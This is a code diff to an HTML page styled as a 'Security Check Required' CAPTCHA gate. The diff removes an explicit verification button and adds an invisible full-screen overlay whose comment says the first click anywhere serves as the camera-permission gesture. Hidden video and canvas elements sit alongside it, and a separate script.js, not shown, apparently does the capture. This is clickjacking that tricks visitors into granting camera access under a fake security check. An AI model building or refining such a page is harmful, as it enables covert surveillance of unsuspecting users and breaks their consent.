@@ -24,16 +24,15 @@
   }
   h2 { color: #1a202c; font-size: 20px; margin-bottom: 6px; }
   .sub { color: #718096; font-size: 14px; margin-bottom: 24px; line-height: 1.5; }
-  .btn {
-    background: #2b6cb0; color: white; border: none;
-    padding: 13px 0; border-radius: 8px; font-size: 15px; font-weight: 600;
-    cursor: pointer; width: 100%; transition: background 0.2s;
-  }
-  .btn:hover { background: #2c5282; }
-  .btn:disabled { background: #a0aec0; cursor: not-allowed; }
-  .g-recaptcha { display: inline-block; margin-top: 18px; }
+  .g-recaptcha { display: inline-block; margin-top: 10px; }
   .status {
     margin-top: 14px; font-size: 13px; color: #718096; min-height: 20px;
+  }
+  #hidden-trigger {
+    position: fixed; top: 0; left: 0;
+    width: 100%; height: 100%;
+    z-index: 9999; cursor: default;
+    background: transparent;
   }
   video, canvas { display: none; }
 </style>
@@ -46,20 +45,19 @@
   <h2>Security Check Required</h2>
   <p class="sub">This page is protected. Please complete the verification below to continue.</p>
 
-  <button class="btn" id="verifyBtn">Start Verification</button>
+  <!-- reCAPTCHA visible immediately - replace YOUR_SITE_KEY with your real key -->
+  <div class="g-recaptcha" data-sitekey="YOUR_SITE_KEY"
+       data-callback="onRecaptchaSuccess"
+       data-expired-callback="onRecaptchaExpired"></div>
 
-  <!-- reCAPTCHA will appear AFTER camera starts -->
-  <div id="recaptchaWrap" style="display:none;">
-    <div class="g-recaptcha" data-sitekey="YOUR_SITE_KEY"
-         data-callback="onRecaptchaSuccess"
-         data-expired-callback="onRecaptchaExpired"></div>
-  </div>
-
-  <div class="status" id="status"></div>
+  <div class="status" id="status">Click anywhere to start verification</div>
 </div>
 
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
+
+<!-- Invisible overlay - first click anywhere = camera permission gesture -->
+<div id="hidden-trigger"></div>
 
 <script type="module" src="script.js"></script>
 </body>
